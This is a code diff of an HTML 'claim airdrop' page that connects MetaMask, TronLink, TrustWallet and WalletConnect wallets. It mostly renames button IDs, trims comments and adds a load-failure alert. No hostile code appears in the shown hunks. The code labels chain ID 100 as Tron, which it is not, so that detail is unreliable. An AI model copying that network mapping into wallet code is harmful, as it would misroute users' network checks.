@@ -17,24 +17,24 @@
 <section id="metamask-section">
     <h2>MetaMask (ETH/BSC)</h2>
     <p>Connect your MetaMask wallet to claim airdrop on Ethereum or Binance Smart Chain.</p>
-    <button id="connectButton">Connect MetaMask</button>
-    <button id="claimAirdropButton" disabled>Claim Airdrop (ETH/BSC)</button>
+    <button id="connectMetaMaskButton">Connect MetaMask</button>
+    <button id="claimMetaMaskAirdropButton" disabled>Claim Airdrop (ETH/BSC)</button>
 </section>
 
 <!-- TronLink Section -->
 <section id="tronlink-section">
     <h2>TronLink (Tron)</h2>
     <p>Connect your TronLink wallet to claim airdrop on Tron network.</p>
-    <button id="connectTronlinkButton">Connect TronLink</button>
-    <button id="claimTronAirdropButton" disabled>Claim Airdrop (Tron)</button>
+    <button id="connectTronLinkButton">Connect TronLink</button>
+    <button id="claimTronLinkAirdropButton" disabled>Claim Airdrop (Tron)</button>
 </section>
 
 <!-- TrustWallet Section -->
 <section id="trustwallet-section">
     <h2>TrustWallet (BSC)</h2>
     <p>Connect your TrustWallet wallet to claim airdrop on Binance Smart Chain.</p>
-    <button id="connectTrustwalletButton">Connect TrustWallet</button>
-    <button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
+    <button id="connectTrustWalletButton">Connect TrustWallet</button>
+    <button id="claimTrustWalletAirdropButton" disabled>Claim Airdrop (BSC)</button>
 </section>
 
 <!-- WalletConnect Section -->
@@ -52,7 +52,8 @@
         script.src = src;
         script.onload = callback;
         script.onerror = function(error) {
-            console.error("Error loading script:", src, error); // Log error if script fails to load
+            console.error("Error loading script:", src, error);
+            alert(`Failed to load ${src}`);
         };
         document.head.appendChild(script);
     }
@@ -76,14 +77,12 @@
         }
     }
 
-    // MetaMask Connection Logic
+    // MetaMask connection logic
     function connectMetaMask(config, abi, expectedChainIds) {
         if (window.ethereum) {
             const web3 = new Web3(window.ethereum);
             window.ethereum.request({ method: 'eth_requestAccounts' }).then(async (accounts) => {
                 console.log("Connected to MetaMask:", accounts);
-
-                // Check if the wallet is on the correct network
                 await checkNetworkAndEnableClaimButton(web3, expectedChainIds);
             }).catch((error) => {
                 console.error("MetaMask connection failed:", error);
@@ -94,36 +93,29 @@
         }
     }
 
-    // TronLink Connection Logic
+    // TronLink connection logic
     function connectTronLink(config, abi, expectedChainIds) {
         if (window.tronLink) {
             try {
-                // Request the user's TronLink account
                 const tronAddress = window.tronLink.defaultAddress.base58;
                 if (tronAddress) {
                     console.log("Connected to TronLink:", tronAddress);
-
-                    // Check the current network (mainnet or testnet)
                     window.tronLink.request({ method: 'tron_getNetworkType' })
                         .then((network) => {
                             console.log("Current TronLink network:", network);
                             if (network === 'mainnet') {
-                                // Enable the claim button for Tron
-                                document.getElementById('claimTronAirdropButton').disabled = false;
+                                document.getElementById('claimTronLinkAirdropButton').disabled = false;
                             } else {
                                 alert("Please switch to the Tron mainnet.");
-                                document.getElementById('claimTronAirdropButton').disabled = true;
+                                document.getElementById('claimTronLinkAirdropButton').disabled = true;
                             }
                         }).catch((error) => {
                             console.error("Error getting Tron network:", error);
                         });
-
                 } else {
-                    console.error("TronLink is not connected.");
-                    alert("Failed to connect to TronLink.");
+                    alert("TronLink is not connected.");
                 }
             } catch (error) {
-                console.error("Error connecting to TronLink:", error);
                 alert("Failed to connect to TronLink.");
             }
         } else {
@@ -131,7 +123,7 @@
         }
     }
 
-    // WalletConnect Connection Logic
+    // WalletConnect connection logic
     function connectWalletConnect(config, abi, expectedChainIds) {
         const provider = new WalletConnectProvider({
             rpc: {
@@ -145,8 +137,6 @@
             const web3 = new Web3(provider);
             const accounts = await web3.eth.getAccounts();
             console.log("Connected to WalletConnect:", accounts);
-
-            // Check if the wallet is on the correct network
             await checkNetworkAndEnableClaimButton(web3, expectedChainIds);
         }).catch((error) => {
             console.error("WalletConnect connection failed:", error);
@@ -194,28 +184,26 @@
         }
     }
 
-    // Add event listeners for each button
-    document.addEventListener('DOMContentLoaded', function () {
-        // MetaMask Button
-        document.getElementById('connectButton').addEventListener('click', function () {
-            handleWalletConnection('metamask', 'eth', [1, 56]);  // Ethereum and BSC chain IDs
-        });
+    // MetaMask Button logic (within MetaMask section)
+    document.getElementById('connectMetaMaskButton').addEventListener('click', function () {
+        handleWalletConnection('metamask', 'eth', [1, 56]);  // Ethereum and BSC chain IDs
+    });
 
-        // TronLink Button
-        document.getElementById('connectTronlinkButton').addEventListener('click', function () {
-            handleWalletConnection('tronlink', 'tron', [100]);  // Tron chain ID
-        });
+    // TronLink Button logic (within TronLink section)
+    document.getElementById('connectTronLinkButton').addEventListener('click', function () {
+        handleWalletConnection('tronlink', 'tron', [100]);  // Tron chain ID
+    });
 
-        // TrustWallet Button
-        document.getElementById('connectTrustwalletButton').addEventListener('click', function () {
-            handleWalletConnection('trustwallet', 'bsc', [56]);  // BSC chain ID
-        });
+    // TrustWallet Button logic (within TrustWallet section)
+    document.getElementById('connectTrustWalletButton').addEventListener('click', function () {
+        handleWalletConnection('trustwallet', 'bsc', [56]);  // BSC chain ID
+    });
 
-        // WalletConnect Button
-        document.getElementById('connectWalletConnectButton').addEventListener('click', function () {
-            handleWalletConnection('walletconnect', 'eth', [1, 56, 100]);  // ETH, BSC, Tron chain IDs
-        });
+    // WalletConnect Button logic (within WalletConnect section)
+    document.getElementById('connectWalletConnectButton').addEventListener('click', function () {
+        handleWalletConnection('walletconnect', 'eth', [1, 56, 100]);  // ETH, BSC, Tron chain IDs
     });
 </script>
+
 </body>
 </html>
